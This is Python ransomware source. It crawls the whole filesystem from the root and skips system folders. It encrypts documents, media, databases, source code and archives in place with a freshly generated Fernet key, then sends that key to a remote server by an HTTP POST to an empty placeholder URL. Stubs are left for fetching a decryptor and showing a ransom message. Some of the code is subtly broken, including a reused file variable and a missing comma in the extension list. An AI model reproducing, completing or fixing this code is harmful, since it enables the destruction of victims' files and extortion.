import os
import requests
import subprocess
from cryptography.fernet import Fernet
from os import name, path

key = Fernet.generate_key()
url = ''
status = 'BAD'

def searchFilesAndEncrypt():
    EXCLUDE_DIRECTORY = (   '/usr', #Mac/Linux system directory
                            '/Library/',
                            '/System',
                            '/Applications',
                            '.Trash',
                            #Windows system directory
                            'Program Files',
                            'Program Files (x86)',
                            'Windows',
                            '$Recycle.Bin',
                            'AppData',
                            
                            'logs',

        )

    EXTENSIONS = (
        # '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
        '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
        '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
        '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies

        '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
        '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
        '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
        '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
        
        '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
        '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
        '.java', '.class', '.jar', # java source code
        '.ps', '.bat', '.vb', '.vbs' # windows based scripts
        '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
        '.go', '.py', '.pyc', '.bf', '.coffee', # other source code files

        '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
            )
        #write traversed to a tuple
    for root, dirs, files in os.walk("/"):
            if any(s in root for s in EXCLUDE_DIRECTORY):
                pass
            else:
                for file in files:
                    if file.endswith(EXTENSIONS):
                        TARGET = os.path.join(root, file)
                        try:
                            encrypt(TARGET)
                        except Exception:
                            continue
    global status; status = 'ALL GOOD'
    sendToServer(status)
def encrypt(file):
    global key
    f = Fernet(key)
    with open(file, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(file, "wb") as file:
        file.write(encrypted_data)

def sendToServer(status):
    global key
    data = f'[{status},{key}]'

    requests.post(url, data)

def message():
    if os.name == 'nt':
        pass
    else:
        pass
def uploadDecryptFile():
    requests.get(url)
    #write to a py file
    
if __name__ == '__main__':
    #encrypt and stuff
    searchFilesAndEncrypt()
    #upload the decrypt executable
    uploadDecryptFile()
    #upload the message after uploading the decrypt executable
    message()
